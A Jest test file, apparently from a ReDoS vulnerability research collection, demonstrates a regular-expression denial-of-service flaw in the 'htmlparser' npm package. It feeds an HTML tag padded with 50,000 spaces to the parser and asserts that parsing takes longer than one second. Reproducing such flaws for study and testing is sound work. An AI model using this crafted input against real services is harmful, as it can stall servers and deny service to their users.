//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-htmlparser.js
test("ReDos in htmlparser", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const htmlparser = require("htmlparser");

    let rawHtml = "<html><x" + genstr(50000, " ") + "x></html>";
    let handler = new htmlparser.DefaultHandler(function (error, dom) {
    });
    let parser = new htmlparser.Parser(handler);

    let t =measureTime(function () {
        parser.parseComplete(rawHtml);
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);

});